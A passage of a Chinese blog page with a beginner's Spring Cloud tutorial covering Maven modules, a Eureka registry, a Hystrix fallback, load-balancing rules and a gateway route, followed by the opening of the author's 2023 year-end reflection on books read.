-<li><code>&lt;version&gt;0.0.1-SNAPSHOT&lt;/version&gt;</code>: 指定项目的版本号，这里的“SNAPSHOT”表示这是一个开发快照版本。</li>
-<li><code>&lt;name&gt;springcloud&lt;/name&gt;</code>: 项目的名称。</li>
-<li><code>&lt;description&gt;springcloud&lt;/description&gt;</code>: 对项目的简短描述。</li>
-</ul>
-</li>
-<li><strong>项目包装类型</strong> (<code>&lt;packaging&gt;</code>)：<ul>
-<li>这里指定了项目的包装类型为<code>pom</code>，意味着这是一个POM项目，而不是一个JAR或WAR项目。POM项目主要用于组织和管理其他项目。</li>
-</ul>
-</li>
-<li><strong>项目属性</strong> (<code>&lt;properties&gt;</code>)：<ul>
-<li><code>&lt;java.version&gt;1.8&lt;/java.version&gt;</code>: 指定项目使用的Java版本，这里是Java 1.8（也称为Java 8）。</li>
-<li><code>&lt;spring-cloud.version&gt;Hoxton.SR1&lt;/spring-cloud.version&gt;</code>: 指定Spring Cloud的版本号，这里使用的是Hoxton.SR1版本。</li>
-</ul>
-</li>
-</ol>
-<p>这段代码主要定义了一个Spring Boot项目及其相关的依赖关系和项目信息。通过这种方式，Maven可以知道如何构建、测试和打包这个项目，以及如何解析和管理项目的依赖关系。对于新手来说，理解这些内容将有助于更好地理解如何使用Maven来管理Java项目。</p>
-<p>做完这一步，你已经成功配置了Cloud的项目，现在我们来测试使用一下子模块</p>
-<p>之前我们已经创建了一个子模块叫做<strong>eureka</strong></p>
-<p>通过在子模块的pom.xml里修改和增加一些说明，来完善项目</p>
-<h2 id="配置子模块eureka"><a href="#配置子模块eureka" class="headerlink" title="配置子模块eureka"></a>配置子模块eureka</h2><p>修改子模块pom.xml的parent</p>
-<p>将parent里的内容修改为父模块的自己,只需要添加前三个即可</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>这样链接父模块的pom后可以实现依赖公用，只需要在父模块的Pom导入依赖，全项目都可以使用共同依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">子模块的pom</span><br><span class="line"><span class="comment">&lt;!--连接父元素--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>springcloud<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--自己的pom--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-eureka<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.0.1-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>spring-eureka<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>spring-eureka<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    java版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>添加子模块依赖</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--        注册中心 eureka 服务依赖--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-server<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>使用注册中心可以方便管理我们的项目配置完成后可以使用端口浏览</p>
-<p>添加完成后在JAVA文件里添加相关配置信息即可</p>
-<p>使用yml配置</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line"><span class="comment">#访问端口号</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">eureka-server</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8081/eureka</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>这段代码是一个YAML格式的配置文件，通常用于配置Spring Boot应用程序的参数。该文件配置了一个Eureka服务注册中心的服务器设置。下面是对每一部分的解释：</p>
-<ol>
-<li><strong>server</strong>:<ul>
-<li>port: 8081<ul>
-<li>这一行指定了服务器监听的端口号为8081。</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>spring</strong>:<ul>
-<li>application<ul>
-<li>name: eureka-server<ul>
-<li>这一部分定义了Spring Boot应用程序的名称为”eureka-server”。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><strong>eureka</strong>:<ul>
-<li>client<ul>
-<li>service-url<ul>
-<li>defaultZone: <a target="_blank" rel="noopener" href="http://localhost:8081/eureka">http://localhost:8081/eureka</a><ul>
-<li>这一部分定义了Eureka客户端的服务URL。在这里，服务将在本地机器的8081端口上注册，并使用基础URL “&#x2F;eureka”。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ol>
-<p>为了方便新手理解：</p>
-<ul>
-<li><strong>YAML</strong>: 这是一个常见的配置文件格式，用于存储配置数据。它使用缩进和冒号来区分键和值。</li>
-<li><strong>Spring Boot</strong>: 是一个用于创建独立、生产级的基于Spring的应用程序的框架。它简化了Spring应用程序的初始化和开发过程。</li>
-<li><strong>Eureka</strong>: 是Netflix开发的服务发现组件，用于定位运行在AWS云或其他云平台上的中间层服务，从而实现中间层服务的故障转移和负载均衡。</li>
-</ul>
-<p>总的来说，这个配置文件是用来设置一个Eureka服务注册中心的服务器，它将在本地的8081端口上运行，并使用默认的服务URL进行服务注册。</p>
-<h2 id="试运行"><a href="#试运行" class="headerlink" title="试运行"></a>试运行</h2><p>配置完成后再java里的SpringEurekaApplication里启动项目来访问服务</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#SpringEurekaApplication.java</span><br><span class="line"><span class="keyword">package</span> com.example.springeureka;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.netflix.eureka.server.EnableEurekaServer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableEurekaServer</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringEurekaApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(SpringEurekaApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>这里需要添加**@EnableEurekaServer**后才能正常访问</p>
-<h2 id="配置子模块consumer"><a href="#配置子模块consumer" class="headerlink" title="配置子模块consumer"></a>配置子模块consumer</h2><p>创建子模块consumer和配置上一个子模块过程一样，修改parent 修改对应版本JDK，增加相关依赖</p>
-<p><strong>注意</strong>：如果出现报错问题，请随时检查你的maven配置问题，绝大多数代码正确报错都是因为Maven下载依赖失败</p>
-<h2 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8082</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8081/eureka</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">spring-consumer</span></span><br></pre></td></tr></table></figure>
-
-<p>和之前不一样的是，这次的端口号要发生改变，同样将这个模块注册到注册中心eureka,然后给新模块设置一个名字</p>
-<p>完成后启动注册中心模块，再启动consumer模块，可以看到新DS Replicas的出现，由于我们注册中心本身也会被注册，如果不想它被注册，可以增加两行代码也设置</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">注册中心配置文件</span> <span class="string">eureka</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">    <span class="attr">port:</span> <span class="number">8081</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">    <span class="attr">client:</span></span><br><span class="line">        <span class="attr">service-url:</span></span><br><span class="line">            <span class="attr">defaultZone:</span> <span class="string">http://localhost:8081/eureka</span></span><br><span class="line">        <span class="attr">fetch-registry:</span> <span class="literal">false</span></span><br><span class="line">        <span class="attr">register-with-eureka:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>
-
-<h2 id="配值子模块provider"><a href="#配值子模块provider" class="headerlink" title="配值子模块provider"></a>配值子模块provider</h2><h3 id="模块启动失败问题解决办法"><a href="#模块启动失败问题解决办法" class="headerlink" title="模块启动失败问题解决办法"></a>模块启动失败问题解决办法</h3><p>如果遇到模块启动失败，依赖添加后还是无法正常启动，请打开项目管理-模块-找到启动失败的模块-修改模块SDK</p>
-<p>即可解决依赖版本JDK冲突</p>
-<p><img src="/Blackcat-loveBlog/png/springcloud2.png"></p>
-<h2 id="熔断器hystrix"><a href="#熔断器hystrix" class="headerlink" title="熔断器hystrix"></a>熔断器hystrix</h2><p>使用熔断器可以在报错时截取并且输出规定好的内容方便让服务者知道问题错误出在哪里</p>
-<p>依赖（高版本会自带无需添加）:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--        容错器hystrix--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-hystrix<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>配置:</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">feign:</span></span><br><span class="line">  <span class="attr">hystrix:</span></span><br><span class="line">    <span class="attr">enabled:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<p>创建的熔断器类:</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springconsumer;</span><br><span class="line"><span class="keyword">import</span> lombok.extern.slf4j.Slf4j;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="meta">@Slf4j</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserFeignHystrix</span> <span class="keyword">implements</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">login</span><span class="params">(String username, String password)</span> &#123;</span><br><span class="line">        log.info(<span class="string">&quot;服务器抛锚&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>Service类需要修改链接熔断器</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springconsumer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.FeignClient;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"></span><br><span class="line"><span class="meta">@FeignClient(value = &quot;spring-provider&quot;,fallback = UserFeignHystrix.class)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/login&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">login</span><span class="params">(<span class="meta">@RequestParam(&quot;username&quot;)</span> String username,<span class="meta">@RequestParam(&quot;password&quot;)</span>String password)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>主要在于这一句</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@FeignClient(value = &quot;spring-provider&quot;,fallback = UserFeignHystrix.class)</span></span><br></pre></td></tr></table></figure>
-
-<p>链接的刚刚创建的类，如果方法出现问题，就会打印<strong>log</strong></p>
-<p>这样当你访问此类的时候就会被熔断</p>
-<h3 id="负载均衡器分担方式"><a href="#负载均衡器分担方式" class="headerlink" title="负载均衡器分担方式"></a>负载均衡器分担方式</h3><p>通过设置集群分担方式可以减轻负载，给多个集群平衡分担请求</p>
-<p>通过一些设置可以实现不同的分担方式，默认是轮播分担</p>
-<p>在启动类添加此方法修改分担方式</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Bean</span></span><br><span class="line">   <span class="keyword">public</span> IRule <span class="title function_">randomRule</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RandomRule</span>();</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
-
-<p>完整类</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.springconsumer;</span><br><span class="line"><span class="keyword">import</span> com.netflix.loadbalancer.IRule;</span><br><span class="line"><span class="keyword">import</span> com.netflix.loadbalancer.RandomRule;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.cloud.openfeign.EnableFeignClients;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.client.RestTemplate;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@EnableFeignClients</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringConsumerApplication</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> RestTemplate <span class="title function_">restTemplate</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RestTemplate</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> IRule <span class="title function_">randomRule</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">RandomRule</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(SpringConsumerApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>官方介绍:</p>
-<p>要通过设置集群分担方式来减轻负载，可以使用负载均衡器来实现。负载均衡器是一种能够平衡多个服务器或集群之间负载的设备，它可以根据指定的策略将请求分发到不同的服务器，以确保各个服务器或集群负载均衡。负载均衡器可以通过多种算法进行请求分担，例如轮询、最少连接、IP哈希等。</p>
-<p>对于新手来说，可以通过以下步骤来理解和使用负载均衡器：</p>
-<ol>
-<li>了解负载均衡器的基本原理：新手可以先了解负载均衡器的工作原理，包括其作用、不同的负载均衡算法以及常见的应用场景。</li>
-<li>选择适合的负载均衡器：根据自己的需求和环境选择合适的负载均衡器，比如Nginx、HAProxy等，并学习其基本配置和使用方法。</li>
-<li>配置和部署负载均衡器：按照文档或教程的指导，配置和部署选定的负载均衡器，包括定义后端服务器、设置负载均衡策略等。</li>
-<li>测试和监控：在配置完成后，进行测试以确保负载均衡器能够正常工作，并设置监控系统来实时监测负载均衡器的性能和状态。</li>
-</ol>
-<p>通过以上步骤，新手可以逐步理解和应用负载均衡器来实现集群分担方式，从而减轻服务器负载并提高系统的可靠性和性能。</p>
-<h2 id="子模块gateway网关"><a href="#子模块gateway网关" class="headerlink" title="子模块gateway网关"></a>子模块gateway网关</h2><p>创建子模块，注意下一步后不要勾选任何依赖尤其是SpringWeb。</p>
-<p>添加依赖:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-gateway<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.cloud<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-cloud-starter-netflix-eureka-client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>配置文件yml:</p>
-<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br><span class="line"><span class="attr">eureka:</span></span><br><span class="line">  <span class="attr">client:</span></span><br><span class="line">    <span class="attr">service-url:</span></span><br><span class="line">      <span class="attr">defaultZone:</span> <span class="string">http://localhost:8081/eureka</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">spring-gateway</span></span><br><span class="line">  <span class="attr">cloud:</span></span><br><span class="line">    <span class="attr">gateway:</span></span><br><span class="line">      <span class="attr">routes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">id:</span> <span class="string">cloud-user-consumer</span>    <span class="comment">#随便起名字</span></span><br><span class="line">          <span class="attr">uri:</span> <span class="string">spring-consumer</span> <span class="comment">#服务名称</span></span><br><span class="line">          <span class="attr">predicates:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">Path=/consumer/**</span>         <span class="comment">#访问路径</span></span><br><span class="line"><span class="comment">#         filters:</span></span><br><span class="line"><span class="comment">#           - StripPrefix=1            #过滤前缀</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>过滤前缀后就无法通过consumer访问其下的方法</p>
-<p>首先配置一个未被使用的端口号</p>
-<p>使用eureka注册</p>
-<p>使用spring-name设置名称</p>
-<p>使用cloud设置路由</p>
-<h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><p>使用网关的路由转发后，可以通过设置好的路径直接访问到对应端口的方法</p>
-<p>转发前:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost:8082/toLogin?username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>
-
-<p>转发后:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost:8080/consumer/toLogin?username=admin&amp;password=admin</span><br></pre></td></tr></table></figure>
-
-<p>因为设置了路由，所以无需再修改端口号，只需要访问网关的端口然后网关再自动访问其他端口就可以</p>
-
-                
-            </div>
-        </article>
-    
-        <article class="post article-entry">
-            <div class="post-title">
-                <a class="post-title-link text-underline" href="/Blackcat-loveBlog/2023/12/31/2023%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/">2023年终总结</a>
-            </div>
-            <p class="sub">Dec 31 2023</p>
-            <div class="post-content">
-                
-                    <p>再有几个小时就是2024年了，刚看完其他UP主做的年终总结，有了自己也要写一个的想法，便有了这篇文章。</p>
-<p>对我而言，我很在乎自己对于时间投入的产出比，在这个年纪，这是我们唯一的资产，所以最终总结为，这一年收获了什么，有什么遗憾，和下一年的目标。</p>
-<p>关于收获，这一年学会了更多有关编程的知识，对网络了解也提高了不少。</p>
-<p>看书方面，由于还是不够自律，看的零零散散，今年看完了瑞达利欧写的《原则》，让我明白，在做人做事上，原则的重要性会影响我们的一生，我们应该为自己设立三个原则，生活原则，工作原则，自身原则，并且不断改善原则，让原则顺其自然帮助你成长，一个好的习惯可以受益终生就是这个说法。</p>
-<p>另外在2022年看完了《小狗钱钱》后，就想去看后续的故事，所以今年看了《富爸爸和穷爸爸》,这是一个系列的书籍，一共有五本，目前只看了一本，教你如何理财，正确看待金钱，非常有价值的一本书，虽然发行的时间距离今天已经有很久，但里面的一些预测放在现在依然精准，教的一些理财方法也很有用，比如我们每个人都应该有一个自己的资产负债表，明确的列出我们所拥有的资产和负债，现金流，帮助我们看清自身经济的真实走向。</p>
-<p>剩下的书籍都是在手机上下载的电子书，阅读起来虽然没有实体书舒服，但不用花钱，就已经知足了。</p>
-<p>唯一看完的一本是《不上班也有钱》，这是第一次有一种被文字拉进去的感觉，看的时候几乎目不暇接，让人有不断翻下去的欲望，以往都是你需要思考，然后停留一会才继续看，但这本书却让我阅读的非常流畅，中间也有一些停顿的点，但一点也不晦涩。它讲述的内容和我目前正在迷茫的点也很吻合，在我目前看来，这几乎是最简单的理财方法了，并且可行，但我认为大部分人都难以做到。</p>
-<p>剩下的书籍过于难啃，都是一些技术类，很多看了一半后不想再看，亦或者看一点都花了大量的时间思考和吸收然后就搁置了。</p>
-<p>比如有一本书叫做《朋友圈的尖子生》，前面的内容非常有趣，但看了一半后后面突然变得乏味无比，可能是和自身境界突然有了很大偏差，环境不同，没有想看下去的欲望了。</p>
-<p>亦或者还有一本叫做《煤老板自述三十年》上面记录到看了60%多后，后面的也不想看了，原因在于我认为有一些和前面的内容高度重合，虽然故事本身不一样，但逻辑剧情起伏没有多大变化，这不怪书，而是世界运行逻辑就是如此，一个成功人，必然经历起伏的人生，但依然推荐这本书，因为真的挺好看的，之前和我爸聊天的时候我也总是会讲一些书中的内容，这就是那个年代很有代表性的一群人。</p>
-<p>有时候想要对自己看的书做一些笔记，方便之后再次阅读有新的感悟，所以我找到了一本书叫做《边写边思考的大脑整理笔记法》，其实它说的还挺对的，但看完后现在已经忘的差不多了。</p>
-<p>有时候在视频上刷到了罗翔老师讲刑法，想到了老师自己也有写一本书，所以就下载下来看了一点，叫做《圆圈正义》，不得不说，让我很受益，如果有时间我会继续看完的。剩下的书过于零散就不讲了。</p>
